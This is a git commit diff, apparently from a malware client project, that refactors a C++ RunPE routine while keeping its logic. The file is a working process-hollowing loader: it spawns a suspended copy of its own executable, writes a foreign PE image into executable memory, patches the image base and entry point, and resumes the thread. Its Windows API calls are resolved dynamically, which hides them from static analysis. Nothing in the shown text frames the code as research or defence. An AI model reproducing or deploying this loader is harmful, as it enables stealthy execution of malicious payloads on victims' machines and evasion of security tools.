792de5a16ec5350d90a591f31fccbbe43dc10c54
Soamane <soamane@mail.ru>
2024-05-02 00:42:45 +0300

    Перевод чисел в 16-ую систему

--- client/user/runpe/runpe.cpp
+++ client/user/runpe/runpe.cpp
@@ -1,51 +1,57 @@
 #include "runpe.h"
 
-#define GET_FUNCTION_PTR(function, fname) reinterpret_cast<decltype(&function)>(RpGetProcAddress("kernel32.dll", fname))
+#include <stdexcept>
+
+#define GET_FUNCTION_PTR(function) reinterpret_cast<decltype(&function)>(RpGetProcAddress("kernel32.dll", #function))
 
 void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
-    PVOID pImage = static_cast<PVOID>(Image.data());
+    PVOID image = static_cast<PVOID>(Image.data());
 
-    auto DosHeader = PIMAGE_DOS_HEADER{};
-    auto NtHeaders = PIMAGE_NT_HEADERS64{};
-    auto SectionHeader = PIMAGE_SECTION_HEADER{};
+    PIMAGE_DOS_HEADER dosHeader = PIMAGE_DOS_HEADER{};
+    PIMAGE_NT_HEADERS64 ntHeaders = PIMAGE_NT_HEADERS64{};
+    PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER{};
 
-    auto si = STARTUPINFOA{};
-    memset(&si, 0, sizeof(si));
+    STARTUPINFOA startupInfo = STARTUPINFOA{};
+    memset(&startupInfo, 0, sizeof(startupInfo));
 
-    auto pi = PROCESS_INFORMATION{};
-    memset(&pi, 0, sizeof(pi));
+    PROCESS_INFORMATION processInfo = PROCESS_INFORMATION{};
+    memset(&processInfo, 0, sizeof(processInfo));
 
-    char FilePath[256];
-    GET_FUNCTION_PTR(GetModuleFileNameA, "GetModuleFileNameA")(nullptr, FilePath, MAX_PATH);
+    char filePath[256];
+    GET_FUNCTION_PTR(GetModuleFileNameA)(nullptr, filePath, MAX_PATH);
 
-    DosHeader = PIMAGE_DOS_HEADER(pImage);
-    NtHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew);
+    dosHeader = PIMAGE_DOS_HEADER(image);
+    ntHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew);
 
-    if (NtHeaders->Signature == IMAGE_NT_SIGNATURE) {
-        if (GET_FUNCTION_PTR(CreateProcessA, "CreateProcessA")(FilePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
-
-            auto ctx = PCONTEXT{};
-            ctx = LPCONTEXT(GET_FUNCTION_PTR(VirtualAlloc, "VirtualAlloc")(0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
-
-            ctx->ContextFlags = CONTEXT_FULL;
-
-            if (GET_FUNCTION_PTR(GetThreadContext, "GetThreadContext")(pi.hThread, LPCONTEXT(ctx))) {
-                auto ImageBase = GET_FUNCTION_PTR(VirtualAllocEx, "VirtualAllocEx")(pi.hProcess, LPVOID(NtHeaders->OptionalHeader.ImageBase), NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-                GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, ImageBase, pImage, NtHeaders->OptionalHeader.SizeOfHeaders, NULL);
-
-                for (auto i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
-                    SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(pImage) + DosHeader->e_lfanew + 264 + (i * 40));
-                    GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, LPVOID(ULONGLONG(ImageBase) + SectionHeader->VirtualAddress), LPVOID(ULONGLONG(pImage) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
-                    GET_FUNCTION_PTR(WriteProcessMemory, "WriteProcessMemory")(pi.hProcess, LPVOID(ctx->Rdx + 0x10), LPVOID(&NtHeaders->OptionalHeader.ImageBase), 8, NULL);
-                }
-
-                ctx->Rcx = ULONGLONG(ImageBase) + NtHeaders->OptionalHeader.AddressOfEntryPoint;
-                GET_FUNCTION_PTR(SetThreadContext, "SetThreadContext")(pi.hThread, LPCONTEXT(ctx));
-                GET_FUNCTION_PTR(ResumeThread, "ResumeThread")(pi.hThread);
-                GET_FUNCTION_PTR(WaitForSingleObject, "WaitForSingleObject")(pi.hProcess, 0);
-            }
-        }
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        throw std::runtime_error("failed to get image signature");
     }
+
+    if (!GET_FUNCTION_PTR(CreateProcessA)(filePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &startupInfo, &processInfo)) {
+        throw std::runtime_error("failed to create process");
+    }
+
+    PCONTEXT ctx = PCONTEXT{};
+    ctx = LPCONTEXT(GET_FUNCTION_PTR(VirtualAlloc)(0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
+    ctx->ContextFlags = CONTEXT_FULL;
+
+    if (!GET_FUNCTION_PTR(GetThreadContext)(processInfo.hThread, LPCONTEXT(ctx))) {
+        throw std::runtime_error("failed to get thread context");
+    }
+
+    LPVOID imageBase = GET_FUNCTION_PTR(VirtualAllocEx)(processInfo.hProcess, LPVOID(ntHeaders->OptionalHeader.ImageBase), ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, imageBase, image, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
+
+    for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew + 0x108 + (i * 0x28));
+        GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ULONGLONG(imageBase) + SectionHeader->VirtualAddress), LPVOID(ULONGLONG(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
+        GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ctx->Rdx + 0x10), LPVOID(&ntHeaders->OptionalHeader.ImageBase), 0x8, NULL);
+    }
+
+    ctx->Rcx = reinterpret_cast<ULONGLONG>(imageBase) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    GET_FUNCTION_PTR(SetThreadContext)(processInfo.hThread, LPCONTEXT(ctx));
+    GET_FUNCTION_PTR(ResumeThread)(processInfo.hThread);
+    GET_FUNCTION_PTR(WaitForSingleObject)(processInfo.hProcess, 0);
 }
 
 PVOID RunPE::RpGetProcAddress(const char* Mod, const char* Proc) {
